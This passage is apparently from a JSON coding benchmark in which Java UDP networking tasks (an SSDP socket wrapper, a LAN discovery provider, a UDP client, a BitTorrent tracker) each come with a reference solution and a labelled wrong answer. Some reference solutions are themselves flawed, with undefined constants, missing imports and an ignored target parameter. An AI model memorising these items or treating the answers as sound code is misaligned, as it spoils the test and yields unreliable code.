byte[1024];\n            int len;\n            ByteArrayOutputStream baos = new ByteArrayOutputStream();\n            while ((len = is.read(buffer)) != -1) {\n                baos.write(buffer, 0, len);\n            }\n            return baos.toByteArray();\n        }\n    }\n}"
  },
  {
    "Task_id": 600,
    "Instruction": "Task Description: Create a Java class for UDP socket communication that can be used for both sending and receiving datagram packets. The class should handle socket creation, binding, message transmission, and reception with proper error handling.\n\nClass Description: HTTPUSocket is a UDP socket wrapper class that provides simplified methods for UDP communication. It manages socket lifecycle and provides methods for sending messages to specific addresses and receiving incoming packets.\n\nAttributes:\n- ssdpUniSock: DatagramSocket - The underlying UDP socket for communication\n- localAddr: String - The local address bound to the socket\n\nMethods:\n- HTTPUSocket() -> void - Default constructor that creates an unbound UDP socket\n- HTTPUSocket(String bindAddr, int bindPort) -> void - Constructor that binds socket to specific address and port\n- HTTPUSocket(int bindPort) -> void - Constructor that binds socket to specific port on all interfaces\n- getDatagramSocket() -> DatagramSocket - Returns the underlying DatagramSocket instance\n- setLocalAddress(String addr) -> void - Sets the local address manually\n- getLocalAddress() -> String - Returns the local address bound to the socket\n- open() -> boolean - Creates an unbound UDP socket, returns success status\n- open(String bindAddr, int bindPort) -> boolean - Binds socket to specific address and port, returns success status\n- open(int bindPort) -> boolean - Binds socket to specific port on all interfaces, returns success status\n- close() -> boolean - Closes the socket, returns success status\n- post(String addr, int port, String msg) -> boolean - Sends a message to specified address and port, returns success status\n- receive() -> SSDPPacket - Receives an incoming packet and returns it wrapped in SSDPPacket object",
    "Canonical_solution": "import java.net.BindException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\n\npublic class HTTPUSocket {\n\n    private DatagramSocket ssdpUniSock = null;\n    private String localAddr = \"\";\n\n    public HTTPUSocket() {\n        open();\n    }\n\n    public HTTPUSocket(String bindAddr, int bindPort) throws BindException {\n        open(bindAddr, bindPort);\n    }\n\n    public HTTPUSocket(int bindPort) {\n        open(bindPort);\n    }\n\n    public DatagramSocket getDatagramSocket() {\n        return ssdpUniSock;\n    }\n\n    public void setLocalAddress(String addr) {\n        localAddr = addr;\n    }\n\n    public String getLocalAddress() {\n        if (0 < localAddr.length())\n            return localAddr;\n        return ssdpUniSock.getLocalAddress().getHostAddress();\n    }\n\n    public boolean open() {\n        close();\n        try {\n            ssdpUniSock = new DatagramSocket();\n        }\n        catch (Exception e) {\n            return false;\n        }\n        return true;\n    }\n\n    public boolean open(String bindAddr, int bindPort) throws BindException {\n        close();\n        try {\n            InetSocketAddress bindInetAddr = new InetSocketAddress(InetAddress.getByName(bindAddr), bindPort);\n            ssdpUniSock = new DatagramSocket(bindInetAddr);\n        }\n        catch (BindException possible) {\n            throw possible;\n        }\n        catch (Exception e) {\n            return false;\n        }\n        setLocalAddress(bindAddr);\n        return true;\n    }\n\n    public boolean open(int bindPort) {\n        close();\n        try {\n            InetSocketAddress bindSock = new InetSocketAddress(bindPort);\n            ssdpUniSock = new DatagramSocket(null);\n            ssdpUniSock.setReuseAddress(true);\n            ssdpUniSock.bind(bindSock);\n        }\n        catch (Exception e) {\n            return false;\n        }\n        return true;\n    }\n\n    public boolean close() {\n        if (ssdpUniSock == null)\n            return true;\n        try {\n            ssdpUniSock.close();\n            ssdpUniSock = null;\n        }\n        catch (Exception e) {\n            return false;\n        }\n        return true;\n    }\n\n    public boolean post(String addr, int port, String msg) {\n        try {\n            InetAddress inetAddr = InetAddress.getByName(addr);\n            DatagramPacket dgmPacket = new DatagramPacket(msg.getBytes(), msg.length(), inetAddr, port);\n            ssdpUniSock.send(dgmPacket);\n        }\n        catch (Exception e) {\n            return false;\n        }\n        return true;\n    }\n\n    public SSDPPacket receive() {\n        byte ssdvRecvBuf[] = new byte[SSDP.RECV_MESSAGE_BUFSIZE];\n        SSDPPacket recvPacket = new SSDPPacket(ssdvRecvBuf, ssdvRecvBuf.length);\n        recvPacket.setLocalAddress(getLocalAddress());\n        try {\n            ssdpUniSock.receive(recvPacket.getDatagramPacket());\n            recvPacket.setTimeStamp(System.currentTimeMillis());\n        }\n        catch (Exception e) {\n            return null;\n        }\n        return recvPacket;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class HTTPUSocket {\n    private DatagramSocket ssdpUniSock;\n    private String localAddr;\n\n    public HTTPUSocket() {\n        open();\n    }\n\n    public HTTPUSocket(String bindAddr, int bindPort) {\n        open(bindAddr, bindPort);\n    }\n\n    public HTTPUSocket(int bindPort) {\n        open(bindPort);\n    }\n\n    public DatagramSocket getDatagramSocket() {\n        return ssdpUniSock;\n    }\n\n    public void setLocalAddress(String addr) {\n        localAddr = addr;\n    }\n\n    public String getLocalAddress() {\n        return localAddr;\n    }\n\n    public boolean open() {\n        try {\n            ssdpUniSock = new DatagramSocket();\n            localAddr = \"\";\n            return true;\n        } catch (SocketException e) {\n            return false;\n        }\n    }\n\n    public boolean open(String bindAddr, int bindPort) {\n        try {\n            InetAddress address = InetAddress.getByName(bindAddr);\n            ssdpUniSock = new DatagramSocket(bindPort, address);\n            localAddr = bindAddr;\n            return true;\n        } catch (SocketException | UnknownHostException e) {\n            return false;\n        }\n    }\n\n    public boolean open(int bindPort) {\n        try {\n            ssdpUniSock = new DatagramSocket(bindPort);\n            localAddr = \"0.0.0.0\";\n            return true;\n        } catch (SocketException e) {\n            return false;\n        }\n    }\n\n    public boolean close() {\n        if (ssdpUniSock != null) {\n            ssdpUniSock.close();\n            ssdpUniSock = null;\n            return true;\n        }\n        return false;\n    }\n\n    public boolean post(String addr, int port, String msg) {\n        try {\n            InetAddress destination = InetAddress.getByName(addr);\n            byte[] data = msg.getBytes();\n            DatagramPacket packet = new DatagramPacket(data, data.length, destination, port);\n            ssdpUniSock.send(packet);\n            return true;\n        } catch (UnknownHostException | IOException e) {\n            return false;\n        }\n    }\n\n    public SSDPPacket receive() {\n        try {\n            byte[] buffer = new byte[65507];\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n            ssdpUniSock.receive(packet);\n            return new SSDPPacket(packet);\n        } catch (IOException e) {\n            return null;\n        }\n    }\n}"
  },
  {
    "Task_id": 603,
    "Instruction": "Task Description: Implement a class that provides UDP-based network communication for device discovery and identity exchange in a local area network (LAN) environment, supporting both server (listener) and client (broadcaster) functionalities.\n\nClass Description: LanLinkProvider is a class that handles UDP communication for device discovery in a LAN. It listens for identity broadcasts from other devices and broadcasts its own identity. It manages socket creation, packet handling, and network trust verification.\n\nAttributes:\n- context: [Context] - Android context for accessing device information and preferences\n- udpServer: [DatagramSocket] - UDP socket for receiving broadcast packets\n- listening: [boolean] - Flag indicating whether the UDP listener is active\n- UDP_PORT: [static final int] - Default UDP port for communication (1716)\n- MIN_PORT: [static final int] - Minimum valid TCP port number (1716)\n- MAX_UDP_PACKET_SIZE: [static final int] - Maximum size of UDP packets (512KB)\n\nMethods:\n- setupUdpListener() -> [void] - Sets up and starts a UDP listener thread that continuously receives packets\n- udpPacketReceived(DatagramPacket packet) -> [void] - Processes received UDP packets containing device identity information\n- sendUdpIdentityPacket(List<InetAddress> ipList, @Nullable Network network) -> [void] - Broadcasts device identity to specified IP addresses\n- configureSocket(Socket socket) -> [void] - Configures socket settings (keep-alive)\n- isDeviceTrusted(String deviceId) -> [boolean] - Checks if a device is marked as trusted in shared preferences\n- onStart() -> [void] - Starts the UDP listener\n- onStop() -> [void] - Stops the UDP listener and cleans up resources",
    "Canonical_solution": "import android.content.Context;\nimport android.net.Network;\nimport android.os.Build;\nimport android.util.Log;\n\nimport org.json.JSONException;\nimport org.kde.kdeconnect.Helpers.ThreadHelper;\nimport org.kde.kdeconnect.NetworkPacket;\nimport org.kde.kdeconnect.Helpers.DeviceHelper;\nimport org.kde.kdeconnect.Helpers.TrustedNetworkHelper;\n\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\nimport java.util.ArrayList;\nimport java.util.List;\n\nimport kotlin.text.Charsets;\n\npublic class LanLinkProvider {\n\n    final static int UDP_PORT = 1716;\n    final static int MIN_PORT = 1716;\n    final static int MAX_UDP_PACKET_SIZE = 1024 * 512;\n\n    private final Context context;\n    private DatagramSocket udpServer;\n    private boolean listening = false;\n\n    private void setupUdpListener() {\n        try {\n            udpServer = new DatagramSocket(null);\n            udpServer.setReuseAddress(true);\n            udpServer.setBroadcast(true);\n        } catch (SocketException e) {\n            Log.e(\"LanLinkProvider\", \"Error creating udp server\", e);\n            throw new RuntimeException(e);\n        }\n        try {\n            udpServer.bind(new InetSocketAddress(UDP_PORT));\n        } catch (SocketException e) {\n            Log.e(\"LanLinkProvider\", \"Error binding udp server\", e);\n        }\n        ThreadHelper.execute(() -> {\n            Log.i(\"UdpListener\", \"Starting UDP listener\");\n            while (listening) {\n                try {\n                    DatagramPacket packet = new DatagramPacket(new byte[MAX_UDP_PACKET_SIZE], MAX_UDP_PACKET_SIZE);\n                    udpServer.receive(packet);\n                    ThreadHelper.execute(() -> {\n                        try {\n                            udpPacketReceived(packet);\n                        } catch (JSONException | IOException e) {\n                            Log.e(\"LanLinkProvider\", \"Exception receiving UDP packet\", e);\n                        }\n                    });\n                } catch (IOException e) {\n                    Log.e(\"LanLinkProvider\", \"UdpReceive exception\", e);\n                }\n            }\n            Log.w(\"UdpListener\", \"Stopping UDP listener\");\n        });\n    }\n\n    @WorkerThread\n    private void udpPacketReceived(DatagramPacket packet) throws JSONException, IOException {\n        final InetAddress address = packet.getAddress();\n        String message = new String(packet.getData(), Charsets.UTF_8);\n        final NetworkPacket identityPacket = NetworkPacket.unserialize(message);\n\n        if (!DeviceInfo.isValidIdentityPacket(identityPacket)) {\n            Log.w(\"KDE/LanLinkProvider\", \"Invalid identity packet\");\n            return;\n        }\n\n        final String deviceId = identityPacket.getString(\"deviceId\");\n        String myId = DeviceHelper.getDeviceId(context);\n        if (deviceId.equals(myId)) {\n            return;\n        }\n\n        Log.i(\"KDE/LanLinkProvider\", \"Broadcast received from \" + identityPacket.getString(\"deviceName\"));\n\n        boolean deviceTrusted = isDeviceTrusted(identityPacket.getString(\"deviceId\"));\n        if (!deviceTrusted && !TrustedNetworkHelper.isTrustedNetwork(context)) {\n            Log.i(\"KDE/LanLinkProvider\", \"Ignoring untrusted device\");\n            return;\n        }\n\n        int tcpPort = identityPacket.getInt(\"tcpPort\", MIN_PORT);\n        if (tcpPort < MIN_PORT || tcpPort > MAX_PORT) {\n            Log.e(\"LanLinkProvider\", \"Invalid TCP port\");\n            return;\n        }\n\n        Socket socket = SocketFactory.getDefault().createSocket(address, tcpPort);\n        configureSocket(socket);\n\n        DeviceInfo myDeviceInfo = DeviceHelper.getDeviceInfo(context);\n        NetworkPacket myIdentity = myDeviceInfo.toIdentityPacket();\n\n        OutputStream out = socket.getOutputStream();\n        out.write(myIdentity.serialize().getBytes());\n        out.flush();\n    }\n\n    @WorkerThread\n    public void sendUdpIdentityPacket(List<InetAddress> ipList, @Nullable Network network) {\n        if (!listening) return;\n\n        DeviceInfo myDeviceInfo = DeviceHelper.getDeviceInfo(context);\n        NetworkPacket identity = myDeviceInfo.toIdentityPacket();\n        identity.set(\"tcpPort\", MIN_PORT);\n\n        byte[] bytes;\n        try {\n            bytes = identity.serialize().getBytes(Charsets.UTF_8);\n        } catch (JSONException e) {\n            Log.e(\"KDE/LanLinkProvider\", \"Failed to serialize packet\", e);\n            return;\n        }\n\n        DatagramSocket socket;\n        try {\n            socket = new DatagramSocket();\n            if (network != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {\n                try {\n                    network.bindSocket(socket);\n                } catch (IOException e) {\n                    Log.w(\"LanLinkProvider\", \"Network bind failed\");\n                }\n            }\n            socket.setReuseAddress(true);\n            socket.setBroadcast(true);\n        } catch (SocketException e) {\n            Log.e(\"KDE/LanLinkProvider\", \"Failed to create socket\", e);\n            return;\n        }\n\n        for (InetAddress ip : ipList) {\n            try {\n                socket.send(new DatagramPacket(bytes, bytes.length, ip, MIN_PORT));\n            } catch (IOException e) {\n                Log.e(\"KDE/LanLinkProvider\", \"Send failed to \" + ip, e);\n            }\n        }\n        socket.close();\n    }\n\n    private void configureSocket(Socket socket) {\n        try {\n            socket.setKeepAlive(true);\n        } catch (SocketException e) {\n            Log.e(\"LanLink\", \"Socket config failed\", e);\n        }\n    }\n\n    private boolean isDeviceTrusted(String deviceId) {\n        return context.getSharedPreferences(\"trusted_devices\", Context.MODE_PRIVATE)\n                     .getBoolean(deviceId, false);\n    }\n\n    public void onStart() {\n        if (!listening) {\n            listening = true;\n            setupUdpListener();\n        }\n    }\n\n    public void onStop() {\n        listening = false;\n        if (udpServer != null) {\n            udpServer.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class LanLinkProvider {\n    private Context context;\n    private DatagramSocket udpServer;\n    private boolean listening;\n    public static final int UDP_PORT = 1716;\n    public static final int MIN_PORT = 1716;\n    public static final int MAX_UDP_PACKET_SIZE = 524288;\n\n    public LanLinkProvider(Context context) {\n        this.context = context;\n    }\n\n    public void setupUdpListener() {\n        if (listening) return;\n        try {\n            udpServer = new DatagramSocket(UDP_PORT);\n            configureSocket(udpServer);\n            listening = true;\n            new Thread(this::listenForPackets).start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void listenForPackets() {\n        byte[] buffer = new byte[MAX_UDP_PACKET_SIZE];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        while (listening) {\n            try {\n                udpServer.receive(packet);\n                udpPacketReceived(packet);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void udpPacketReceived(DatagramPacket packet) {\n        byte[] data = packet.getData();\n        String receivedData = new String(data, 0, packet.getLength());\n        // Parse receivedData and handle device discovery logic\n    }\n\n    public void sendUdpIdentityPacket(List<InetAddress> ipList, @Nullable Network network) {\n        String identityData = createIdentityData();\n        byte[] data = identityData.getBytes();\n        if (ipList.isEmpty()) {\n            InetAddress broadcast = InetAddress.getByName(\"255.255.255.255\");\n            DatagramPacket packet = new DatagramPacket(data, data.length, broadcast, UDP_PORT);\n            try {\n                udpServer.send(packet);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        } else {\n            for (InetAddress ip : ipList) {\n                DatagramPacket packet = new DatagramPacket(data, data.length, ip, UDP_PORT);\n                try {\n                    udpServer.send(packet);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private String createIdentityData() {\n        return \"device_id=\" + getDeviceId() + \"&name=\" + getDeviceName();\n    }\n\n    private String getDeviceId() {\n        SharedPreferences prefs = context.getSharedPreferences(\"device_prefs\", Context.MODE_PRIVATE);\n        return prefs.getString(\"device_id\", \"default_id\");\n    }\n\n    private String getDeviceName() {\n        return context.getPackageName();\n    }\n\n    public void configureSocket(Socket socket) {\n        try {\n            socket.setReuseAddress(true);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public boolean isDeviceTrusted(String deviceId) {\n        SharedPreferences prefs = context.getSharedPreferences(\"device_prefs\", Context.MODE_PRIVATE);\n        return prefs.contains(deviceId);\n    }\n\n    public void onStart() {\n        setupUdpListener();\n    }\n\n    public void onStop() {\n        listening = false;\n        if (udpServer != null) {\n            udpServer.close();\n            udpServer = null;\n        }\n    }\n}"
  },
  {
    "Task_id": 604,
    "Instruction": "Task Description: Implement a UDP client class in Java that can send UDP packets to a specified target address and port, with optional response waiting functionality.\n\nClass Description: The UDPClient class provides functionality to send UDP packets to a network target. It supports both fire-and-forget mode and request-response mode. The class manages its own socket and thread for asynchronous operation, and includes cleanup mechanisms.\n\nAttributes:\n- mUdpSocket: DatagramSocket - The UDP socket used for communication\n- mRunning: boolean - Flag indicating whether the client is currently active\n- mThread: Thread - The thread handling the UDP communication\n\nMethods:\n- sendUDPPacket(String targetAddress, int port, String data, boolean waitResponse, ResponseHandler handler) -> void - \n  Sends a UDP packet to the specified address and port. If waitResponse is true, it will wait for and deliver any response.\n  Parameters:\n    - targetAddress: String - The IP address or hostname of the target\n    - port: int - The destination port number\n    - data: String - The message to send\n    - waitResponse: boolean - Whether to wait for a response\n    - handler: ResponseHandler - Callback interface for handling responses or errors\n\n- stop() -> void - \n  Stops any ongoing UDP communication and cleans up resources. Closes the socket and interrupts the thread if active.\n\n- interface ResponseHandler - \n  Callback interface for handling responses or errors\n  Methods:\n    - onResponse(String response) -> void - Called when a response is received\n    - onError(String errorMessage) -> void - Called when an error occurs",
    "Canonical_solution": "import android.content.SharedPreferences;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.view.View.OnClickListener;\nimport android.widget.Button;\nimport android.widget.CheckBox;\nimport android.widget.EditText;\nimport android.widget.Spinner;\nimport android.widget.Toast;\nimport android.widget.ToggleButton;\n\nimport org.csploit.android.R;\nimport org.csploit.android.core.Plugin;\nimport org.csploit.android.core.System;\nimport org.csploit.android.net.Target;\nimport org.csploit.android.net.Target.Type;\n\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\n\npublic class UDPClient {\n\n    private DatagramSocket mUdpSocket = null;\n    private boolean mRunning = false;\n    private Thread mThread = null;\n\n    public void sendUDPPacket(String targetAddress, int port, String data, boolean waitResponse, final ResponseHandler handler) {\n        if (!mRunning) {\n            mRunning = true;\n\n            mThread = new Thread(new Runnable() {\n                @Override\n                public void run() {\n                    String error = null;\n                    try {\n                        mUdpSocket = new DatagramSocket();\n                        DatagramPacket packet = new DatagramPacket(\n                                data.getBytes(), data.length(),\n                                System.getCurrentTarget().getAddress(), port);\n\n                        mUdpSocket.send(packet);\n\n                        if (waitResponse) {\n                            byte[] buffer = new byte[1024];\n                            DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n                            mUdpSocket.receive(response);\n                            final String responseText = new String(buffer);\n                            handler.onResponse(responseText);\n                        }\n                    } catch (Exception e) {\n                        error = e.getMessage();\n                    } finally {\n                        if (mUdpSocket != null) {\n                            mUdpSocket.close();\n                        }\n                        mRunning = false;\n                        if (error != null) {\n                            handler.onError(error);\n                        }\n                    }\n                }\n            });\n\n            mThread.start();\n        }\n    }\n\n    public void stop() {\n        mRunning = false;\n        try {\n            if (mThread != null && mThread.isAlive()) {\n                if (mUdpSocket != null)\n                    mUdpSocket.close();\n                mThread.interrupt();\n                mThread = null;\n            }\n        } catch (Exception e) {\n            // Ignore\n        }\n    }\n\n    public interface ResponseHandler {\n        void onResponse(String response);\n        void onError(String errorMessage);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class UDPClient {\n    private DatagramSocket mUdpSocket;\n    private boolean mRunning;\n    private Thread mThread;\n\n    public UDPClient() throws SocketException {\n        mUdpSocket = new DatagramSocket();\n        mRunning = true;\n        mThread = new Thread(this::run);\n        mThread.start();\n    }\n\n    public void sendUDPPacket(String targetAddress, int port, String data, boolean waitResponse, ResponseHandler handler) {\n        try {\n            byte[] sendData = data.getBytes();\n            InetAddress address = InetAddress.getByName(targetAddress);\n            DatagramPacket packet = new DatagramPacket(sendData, sendData.length, address, port);\n            mUdpSocket.send(packet);\n\n            if (waitResponse) {\n                byte[] receiveData = new byte[1024];\n                DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n                mUdpSocket.receive(receivePacket);\n                String response = new String(receiveData, 0, receivePacket.getLength());\n                handler.onResponse(response);\n            }\n        } catch (Exception e) {\n            handler.onError(e.getMessage());\n        }\n    }\n\n    public void stop() {\n        mRunning = false;\n        mThread.interrupt();\n        mUdpSocket.close();\n    }\n\n    private void run() {\n        while (mRunning) {\n            try {\n                byte[] buffer = new byte[1024];\n                DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n                mUdpSocket.receive(packet);\n                String response = new String(buffer, 0, packet.getLength());\n                // Handle asynchronous response\n                // This part would need to associate with a handler, but for simplicity it's omitted\n            } catch (Exception e) {\n                // Handle exceptions\n            }\n        }\n    }\n\n    public interface ResponseHandler {\n        void onResponse(String response);\n        void onError(String errorMessage);\n    }\n}"
  },
  {
    "Task_id": 605,
    "Instruction": "Task Description: Implement a UDP-based tracker server that handles client connections and announcements for a peer-to-peer network, managing connection IDs and responding to client requests with appropriate status information.\n\nClass Description: SingleClientUdpTracker is a UDP server implementation that simulates a BitTorrent tracker, handling client connect and announce requests while maintaining connection state and expiration.\n\nAttributes:\n- CONNECTION_EXPIRATION_TIME: [Duration] - Maximum duration before a connection expires\n- EPHEMERAL_CONNECTION_ID: [long] - Magic number used for initial connection requests\n- CONNECT_CODE: [int] - Action code for connection requests\n- ANNOUNCE_CODE: [int] - Action code for announce requests\n- ERROR_CODE: [int] - Action code for error responses\n- serverSocket: [DatagramSocket] - UDP socket for communication\n- interval: [int] - Announce interval to send to clients\n- leechers: [int] - Number of leechers to report\n- seeders: [int] - Number of seeders to report\n- shutdown: [boolean] - Flag to control server shutdown\n- currentConnection: [long] - Current active connection ID\n- connectedOn: [long] - Timestamp of when current connection was established\n\nMethods:\n- SingleClientUdpTracker([int interval, int leechers, int seeders]) -> [void] - Constructor that initializes the UDP socket with random port and sets tracker parameters\n- getServerAddress() -> [SocketAddress] - Returns the local socket address of the server\n- run() -> [void] - Main server loop that receives requests and sends responses\n- processRequest([byte[] requestData]) -> [byte[]] - Processes incoming UDP packets and generates appropriate responses\n- generateConnectionId() -> [long] - Generates a new random connection ID\n- createConnectResponse([long connectionId, int transactionId]) -> [byte[]] - Creates a connect response packet\n- createAnnounceResponse([long connectionId, int transactionId]) -> [byte[]] - Creates an announce response packet\n- createError([int transactionId, String message]) -> [byte[]] - Creates an error response packet\n- shutdown() -> [void] - Shuts down the server and closes the socket",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.Inet4Address;\nimport java.net.InetSocketAddress;\nimport java.net.SocketAddress;\nimport java.net.SocketException;\nimport java.nio.charset.StandardCharsets;\nimport java.time.Duration;\nimport java.util.Arrays;\nimport java.util.Random;\n\npublic class SingleClientUdpTracker {\n\n    private static final Duration CONNECTION_EXPIRATION_TIME = Duration.ofMinutes(2);\n    private static final long EPHEMERAL_CONNECTION_ID = 0x41727101980L;\n\n    private static final int CONNECT_CODE = 0;\n    private static final int ANNOUNCE_CODE = 1;\n    private static final int ERROR_CODE = 3;\n\n    private final DatagramSocket serverSocket;\n    private final int interval;\n    private final int leechers;\n    private final int seeders;\n\n    private volatile boolean shutdown;\n    private volatile long currentConnection;\n    private volatile long connectedOn;\n\n    public SingleClientUdpTracker(int interval, int leechers, int seeders) throws SocketException {\n        this.serverSocket = new DatagramSocket(new InetSocketAddress(Inet4Address.getLoopbackAddress(), 0));\n        this.interval = interval;\n        this.leechers = leechers;\n        this.seeders = seeders;\n    }\n\n    public SocketAddress getServerAddress() {\n        return serverSocket.getLocalSocketAddress();\n    }\n\n    public void run() {\n        byte[] rbuf = new byte[8192];\n        DatagramPacket received = new DatagramPacket(rbuf, rbuf.length);\n        try {\n            serverSocket.receive(received);\n        } catch (IOException e) {\n            throw new RuntimeException(\"Unexpected I/O error\", e);\n        }\n\n        byte[] response = processRequest(Arrays.copyOfRange(rbuf, 0, received.getLength()));\n        DatagramPacket sent = new DatagramPacket(response, response.length, received.getSocketAddress());\n        try {\n            serverSocket.send(sent);\n        } catch (IOException e) {\n            throw new RuntimeException(\"Unexpected I/O error\", e);\n        }\n    }\n\n    private byte[] processRequest(byte[] requestData) {\n        long connectionId = Protocols.readLong(requestData, 0);\n        int action = Protocols.readInt(requestData, 8);\n        int transactionId = Protocols.readInt(requestData, 12);\n        boolean connectionExpired = System.currentTimeMillis() - connectedOn > CONNECTION_EXPIRATION_TIME.toMillis();\n\n        switch (action) {\n            case CONNECT_CODE: {\n                if (connectionId != EPHEMERAL_CONNECTION_ID) {\n                    return createError(transactionId,\n                            \"Connect request should use \" + EPHEMERAL_CONNECTION_ID + \" as connection ID\");\n                } else if (!connectionExpired) {\n                    return createError(transactionId, \"Connection is not expired yet: \" + connectionId);\n                }\n                currentConnection = generateConnectionId();\n                connectedOn = System.currentTimeMillis();\n                return createConnectResponse(currentConnection, transactionId);\n            }\n            case ANNOUNCE_CODE: {\n                if (currentConnection != connectionId) {\n                    return createError(transactionId, \"Unknown connection: \" + connectionId);\n                } else if (connectionExpired) {\n                    return createError(transactionId, \"Connection expired: \" + connectionId);\n                }\n                return createAnnounceResponse(currentConnection, transactionId);\n            }\n            default: {\n                return createError(transactionId, \"Unsupported action: \" + action);\n            }\n        }\n    }\n\n    private long generateConnectionId() {\n        return new Random(System.currentTimeMillis()).nextLong();\n    }\n\n    private byte[] createConnectResponse(long connectionId, int transactionId) {\n        byte[] data = new byte[4 + 4 + 8];\n        System.arraycopy(Protocols.getIntBytes(CONNECT_CODE), 0, data, 0, 4);\n        System.arraycopy(Protocols.getIntBytes(transactionId), 0, data, 4, 4);\n        System.arraycopy(Protocols.getLongBytes(connectionId), 0, data, 8, 8);\n        return data;\n    }\n\n    private byte[] createAnnounceResponse(long connectionId, int transactionId) {\n        byte[] data = new byte[4 + 4 + 4 + 4 + 4];\n        System.arraycopy(Protocols.getIntBytes(ANNOUNCE_CODE), 0, data, 0, 4);\n        System.arraycopy(Protocols.getIntBytes(transactionId), 0, data, 4, 4);\n        System.arraycopy(Protocols.getIntBytes(interval), 0, data, 8, 4);\n        System.arraycopy(Protocols.getIntBytes(leechers), 0, data, 12, 4);\n        System.arraycopy(Protocols.getIntBytes(seeders), 0, data, 16, 4);\n        return data;\n    }\n\n    private byte[] createError(int transactionId, String message) {\n        byte[] messageBytes = message.getBytes(StandardCharsets.US_ASCII);\n        byte[] data = new byte[4 + 4 + messageBytes.length];\n        System.arraycopy(Protocols.getIntBytes(ERROR_CODE), 0, data, 0, 4);\n        System.arraycopy(Protocols.getIntBytes(transactionId), 0, data, 4, 4);\n        System.arraycopy(messageBytes, 0, data, 8, messageBytes.length);\n        return data;\n    }\n\n    public void shutdown() {\n        this.shutdown = true;\n        this.serverSocket.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class SingleClientUdpTracker {\n    private static final long CONNECTION_EXPIRATION_TIME = 60000;\n    private static final long EPHEMERAL_CONNECTION_ID = 0x123456789ABCDEF0L;\n    private static final int CONNECT_CODE = 0;\n    private static final int ANNOUNCE_CODE = 1;\n    private static final int ERROR_CODE = 2;\n    private DatagramSocket serverSocket;\n    private int interval;\n    private int leechers;\n    private int seeders;\n    private boolean shutdown;\n    private long currentConnection;\n    private long connectedOn;\n\n    public SingleClientUdpTracker(int interval, int leechers, int seeders) {\n        this.interval = interval;\n        this.leechers = leechers;\n        this.seeders = seeders;\n        try {\n            serverSocket = new DatagramSocket();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        currentConnection = 0;\n        connectedOn = 0;\n        shutdown = false;\n    }\n\n    public SocketAddress getServerAddress() {\n        return new InetSocketAddress(serverSocket.getLocalAddress(), serverSocket.getLocalPort());\n    }\n\n    public void run() {\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        while (!shutdown) {\n            try {\n                serverSocket.receive(packet);\n                byte[] requestData = packet.getData();\n                int length = packet.getLength();\n                byte[] response = processRequest(requestData);\n                DatagramPacket responsePacket = new DatagramPacket(response, response.length, packet.getSocketAddress());\n                serverSocket.send(responsePacket);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private byte[] processRequest(byte[] requestData) {\n        int transactionId = 0;\n        int actionCode = 0;\n        if (requestData.length >= 8) {\n            transactionId = ByteBuffer.wrap(requestData, 0, 4).getInt();\n            actionCode = ByteBuffer.wrap(requestData, 4, 4).getInt();\n        }\n        switch (actionCode) {\n            case CONNECT_CODE:\n                long newConnectionId = generateConnectionId();\n                currentConnection = newConnectionId;\n                connectedOn = System.currentTimeMillis();\n                return createConnectResponse(newConnectionId, transactionId);\n            case ANNOUNCE_CODE:\n                if (currentConnection != 0 && System.currentTimeMillis() - connectedOn < CONNECTION_EXPIRATION_TIME) {\n                    return createAnnounceResponse(currentConnection, transactionId);\n                } else {\n                    return createError(transactionId, \"Invalid connection\");\n                }\n            default:\n                return createError(transactionId, \"Unknown action\");\n        }\n    }\n\n    private long generateConnectionId() {\n        return (long) (Math.random() * Long.MAX_VALUE);\n    }\n\n    private byte[] createConnectResponse(long connectionId, int transactionId) {\n        ByteBuffer buffer = ByteBuffer.allocate(16);\n        buffer.putInt(transactionId);\n        buffer.putInt(CONNECT_CODE);\n        buffer.putLong(connectionId);\n        return buffer.array();\n    }\n\n    private byte[] createAnnounceResponse(long connectionId, int transactionId) {\n        ByteBuffer buffer = ByteBuffer.allocate(4 + 4 + 4 + 4 + 4);\n        buffer.putInt(transactionId);\n        buffer.putInt(ANNOUNCE_CODE);\n        buffer.putInt(interval);\n        buffer.putInt(leechers);\n        buffer.putInt(seeders);\n        return buffer.array();\n    }\n\n    private byte[] createError(int transactionId, String message) {\n        ByteBuffer buffer = ByteBuffer.allocate(4 + 4 + message.length() + 1);\n        buffer.putInt(transactionId);\n        buffer.putInt(ERROR_CODE);\n        buffer.put(message.getBytes());\n        buffer.put((byte) 0);\n        return buffer.array();\n    }\n\n    public void shutdown() {\n        shutdown = true;\n        if (serverSocket != null) {\n            serverSocket.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 607,
